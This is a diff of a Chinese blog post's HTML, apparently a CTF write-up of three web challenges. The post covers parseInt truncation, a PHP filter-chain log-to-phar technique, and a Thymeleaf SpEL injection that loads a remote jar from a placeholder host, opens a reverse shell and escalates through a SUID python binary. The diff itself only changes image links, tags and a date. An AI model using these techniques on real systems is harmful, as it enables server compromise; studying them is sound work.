@@ -24,7 +24,7 @@
   
   <title>春秋杯-WEB - byc_404&#39;s blog</title>
   
-    <meta name="keywords" content="CTF,WEB,wp,Java">
+    <meta name="keywords" content="WEB,CTF,wp,Java">
   
 
   
@@ -464,7 +464,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
   <p>周末看pwn2win的间隙做了下春秋杯的web。从结果上看题目质量还可以，也拿了2个三血。本来以为可以ak web的，但是因为最后一题远程环境太卡了，所以没在比赛时间内做出来。因此这里总结性地介绍下解三个web的方法思路。</p>
 <a id="more"></a>
 
-<h2 id="ctfaker"><a href="#ctfaker" class="headerlink" title="ctfaker"></a>ctfaker</h2><p>typescript源码给出来了。仔细看会发现其实可控点只有<code>/levelup</code>一处，所以快速定位到factor上<br><img src="https://hackmd.summershrimp.com/uploads/upload_66f0b0ef0bcbbbb6ec4c4165af0cb982.png" class="lazyload" data-srcset="https://hackmd.summershrimp.com/uploads/upload_66f0b0ef0bcbbbb6ec4c4165af0cb982.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p>
+<h2 id="ctfaker"><a href="#ctfaker" class="headerlink" title="ctfaker"></a>ctfaker</h2><p>typescript源码给出来了。仔细看会发现其实可控点只有<code>/levelup</code>一处，所以快速定位到factor上<br><img src="https://imgbucket404.oss-cn-beijing.aliyuncs.com/img/upload_66f0b0ef0bcbbbb6ec4c4165af0cb982.png" class="lazyload" data-srcset="https://imgbucket404.oss-cn-beijing.aliyuncs.com/img/upload_66f0b0ef0bcbbbb6ec4c4165af0cb982.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p>
 <p>factor由可控值经<code>parseInt</code>处理。而<code>parseInt</code> 有传字符串或科学计数法被截断的特性。那么我们就可以让属性变得足够大。一次打败所有怪兽</p>
 <p><code>parseInt(&#39;99999999999999e-40&#39;) == 99999999999999</code></p>
 <pre><code class="python"># coding: utf-8
@@ -476,16 +476,16 @@ r = requests.post(url + &#39;levelup&#39;, json = {
 r = requests.get(url+&#39;fight&#39;)
 r = requests.get(url+&#39;monster&#39;)
 print(r.text)</code></pre>
-<h2 id="easyfilter"><a href="#easyfilter" class="headerlink" title="easyfilter"></a>easyfilter</h2><p>我们可以看到关键代码<br><img src="https://hackmd.summershrimp.com/uploads/upload_d57ba63861c48ccfa33c07001e8d84f1.png" class="lazyload" data-srcset="https://hackmd.summershrimp.com/uploads/upload_d57ba63861c48ccfa33c07001e8d84f1.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p>
+<h2 id="easyfilter"><a href="#easyfilter" class="headerlink" title="easyfilter"></a>easyfilter</h2><p>我们可以看到关键代码<br><img src="https://imgbucket404.oss-cn-beijing.aliyuncs.com/img/upload_d57ba63861c48ccfa33c07001e8d84f1.png" class="lazyload" data-srcset="https://imgbucket404.oss-cn-beijing.aliyuncs.com/img/upload_d57ba63861c48ccfa33c07001e8d84f1.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p>
 <p>其实熟悉的就应该知道，这是laravel8 debug mode下漏洞代码的简化版。即进行一组可控的<code>file_get_contents + file_put_contents</code>。<br>laravel8 的洞如果没有跟过的话，还是建议看一下。很好的运用了php各种filter的性质。</p>
 <p>回到本题。我们可以同样采用这个思路，先通过报错手段创建log文件。</p>
-<p>看一下log格式。<br><img src="https://hackmd.summershrimp.com/uploads/upload_238a305fa8aa9897cc392e9d062a1096.png" class="lazyload" data-srcset="https://hackmd.summershrimp.com/uploads/upload_238a305fa8aa9897cc392e9d062a1096.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p>
+<p>看一下log格式。<br><img src="https://imgbucket404.oss-cn-beijing.aliyuncs.com/img/upload_238a305fa8aa9897cc392e9d062a1096.png" class="lazyload" data-srcset="https://imgbucket404.oss-cn-beijing.aliyuncs.com/img/upload_238a305fa8aa9897cc392e9d062a1096.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p>
 <p>虽然跟laravel不太一样，但还是能用类似手段处理的。这里我简单提一下laravel的思路</p>
 <p>1.convert.base64-decode 过滤器可以直接把非base64字符处理掉<br>2.convert.iconv.utf-16le.utf-8 可以把utf-16转utf-8。这一步可以将很多正常字符转成乱码</p>
 <p>那么似乎，我们可以将payload的base64编码进行utf-16编码写入log,然后先用convert.iconv.utf-16le.utf-8过滤器，使得log中只有base64-payload是正常base64字符集内的。然后用convert.base64-decode处理,就只剩下payload了。</p>
 <p>但是，由于我们的目的是写入phar.里面含有<code>%00</code>.所以我们还需要找到写入<code>%00</code>的方法。方案就是使用php filter的内置过滤器<code>convert.quoted-printable-decode</code>.它的encode就是编码成<code>={字符ascii码}</code>,所以我们可以将空字节按<code>=00</code>写入。</p>
 <p>第一步清log的话用<a href="https://www.ambionics.io/blog/laravel-debug-rce" target="_blank" rel="noopener">ambionics</a>的方法就行。第二步我在尝试直接照搬失败后，想到了不如直接写入payload。由于这里file参数是get传的,报错写到log里时参数被url编码了,整个log里也会有一个我们原始的payload + 一个url编码后的payload。不过由于thinkphp这里的log把http请求的路径参数等都带上了。所以我就直接socket发包，把payload的位置控制在file后面，保证log里只有一处payload,且不会被编码.</p>
-<p>效果：<br><img src="https://hackmd.summershrimp.com/uploads/upload_9e23d358da6b0e8642299d21b46d3ea5.png" class="lazyload" data-srcset="https://hackmd.summershrimp.com/uploads/upload_9e23d358da6b0e8642299d21b46d3ea5.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p>
+<p>效果：<br><img src="https://imgbucket404.oss-cn-beijing.aliyuncs.com/img/upload_9e23d358da6b0e8642299d21b46d3ea5.png" class="lazyload" data-srcset="https://imgbucket404.oss-cn-beijing.aliyuncs.com/img/upload_9e23d358da6b0e8642299d21b46d3ea5.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p>
 <p>最后一个小问题就是<code>iconv.utf-16le.utf-8</code>处理内容需要偶数长度。这个直接55开概率填充字符就好了(</p>
 <p>exp</p>
 <pre><code class="python"># coding: utf-8
@@ -580,7 +580,7 @@ $p-&gt;stopBuffering();
 <p> 漏洞就是个thymeleaf 的ssti,或者说就是SpEL.因为是springboot的环境，所以还是很好想到<code>thymeleaf</code>的。关键还是怎么绕waf.</p>
 <p> 这里测了下，估计waf有<code>java.lang.*</code>,<code>forName</code>,<code>newInstance</code>,<code>new</code>,<code>toString</code>,runtimexx 等等。但是URLclassloader还在。所以可以远程加载类</p>
 <p> 这里我们可以利用SpEL的特性，关键字不区分大小写，正常创建对象。<br> <code>New java.net.URLClassLoader(New java.net.URL[]{New java.net.URL(&quot;http://xxxx/xxx.jar&quot;})</code></p>
-<p> 紧接着就遇到第二个问题。无法使用字符串。这里常规手段<code>T(java.lang.Character)</code>是不行了.于是我去翻了下thymeleaf的文档。发现有很多非常好用的内置variable<br> <a href="https://www.thymeleaf.org/doc/tutorials/2.1/usingthymeleaf.html#appendix-a-expression-basic-objects" target="_blank" rel="noopener">https://www.thymeleaf.org/doc/tutorials/2.1/usingthymeleaf.html#appendix-a-expression-basic-objects</a><br> 当然,这些web context有一半也被ban掉了。但是看到下面的<code>httpServletRequest</code>的方法<code>getParameter</code>,应该能够读取http请求的参数。这样我们就能传入字符串了。<br><img src="https://hackmd.summershrimp.com/uploads/upload_d1055434354fd63d2737bfe442c42e91.png" class="lazyload" data-srcset="https://hackmd.summershrimp.com/uploads/upload_d1055434354fd63d2737bfe442c42e91.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p>
+<p> 紧接着就遇到第二个问题。无法使用字符串。这里常规手段<code>T(java.lang.Character)</code>是不行了.于是我去翻了下thymeleaf的文档。发现有很多非常好用的内置variable<br> <a href="https://www.thymeleaf.org/doc/tutorials/2.1/usingthymeleaf.html#appendix-a-expression-basic-objects" target="_blank" rel="noopener">https://www.thymeleaf.org/doc/tutorials/2.1/usingthymeleaf.html#appendix-a-expression-basic-objects</a><br> 当然,这些web context有一半也被ban掉了。但是看到下面的<code>httpServletRequest</code>的方法<code>getParameter</code>,应该能够读取http请求的参数。这样我们就能传入字符串了。<br><img src="https://imgbucket404.oss-cn-beijing.aliyuncs.com/img/upload_d1055434354fd63d2737bfe442c42e91.png" class="lazyload" data-srcset="https://imgbucket404.oss-cn-beijing.aliyuncs.com/img/upload_d1055434354fd63d2737bfe442c42e91.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p>
 <p> 然后遇到第三个问题。原本我打算远程加载恶意类,实例化然后直接命令执行。然而<code>newInstance</code>被ban了。。。但是毕竟我们现在可以做到加载类,那么反射调用任意方法来执行命令应该没有什么问题。看了下<code>getDeclaredMethod</code>跟<code>invoke</code>都在，解决方法就水落石出了。</p>
 <p>创建恶意类。我们把命令执行代码写入其静态rce方法。</p>
 <pre><code class="java">import java.io.*;
@@ -616,7 +616,7 @@ def poc():
 
 poc()</code></pre>
 <p>反弹shell成功。然后发现readflag需要root权限。看了下没有其他可控root服务。所以<code>find / -user root -perm -4000</code>找下suid,发现了<code>python2.7</code>是有suid位的。直接提权readflag即可</p>
-<p> <img src="https://hackmd.summershrimp.com/uploads/upload_57dfd9f7139ec727d0ebf169e29ff3d8.png" class="lazyload" data-srcset="https://hackmd.summershrimp.com/uploads/upload_57dfd9f7139ec727d0ebf169e29ff3d8.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p>
+<p> <img src="https://imgbucket404.oss-cn-beijing.aliyuncs.com/img/upload_57dfd9f7139ec727d0ebf169e29ff3d8.png" class="lazyload" data-srcset="https://imgbucket404.oss-cn-beijing.aliyuncs.com/img/upload_57dfd9f7139ec727d0ebf169e29ff3d8.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p>
 <h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><p> 总的说题目质量还可以。但是环境很迷,某种角度上来说顺便帮我巩固了波java( </p>
 
   
@@ -660,10 +660,10 @@ poc()</code></pre>
     <div class='new-meta-box'>
       
         
-          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2021-05-30T00:59:59+08:00">
+          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2023-06-30T16:08:32+08:00">
   <a class='notlink'>
     <i class="fas fa-edit fa-fw" aria-hidden="true"></i>
-    <p>更新于：May 30, 2021</p>
+    <p>更新于：Jun 30, 2023</p>
   </a>
 </div>
 
@@ -672,7 +672,7 @@ poc()</code></pre>
         
           
   
-  <div class="new-meta-item meta-tags"><a class="tag" href="/tags/CTF/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>CTF</p></a></div> <div class="new-meta-item meta-tags"><a class="tag" href="/tags/WEB/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>WEB</p></a></div> <div class="new-meta-item meta-tags"><a class="tag" href="/tags/wp/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>wp</p></a></div> <div class="new-meta-item meta-tags"><a class="tag" href="/tags/Java/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>Java</p></a></div>
+  <div class="new-meta-item meta-tags"><a class="tag" href="/tags/WEB/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>WEB</p></a></div> <div class="new-meta-item meta-tags"><a class="tag" href="/tags/CTF/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>CTF</p></a></div> <div class="new-meta-item meta-tags"><a class="tag" href="/tags/wp/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>wp</p></a></div> <div class="new-meta-item meta-tags"><a class="tag" href="/tags/Java/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>Java</p></a></div>
 
 
         
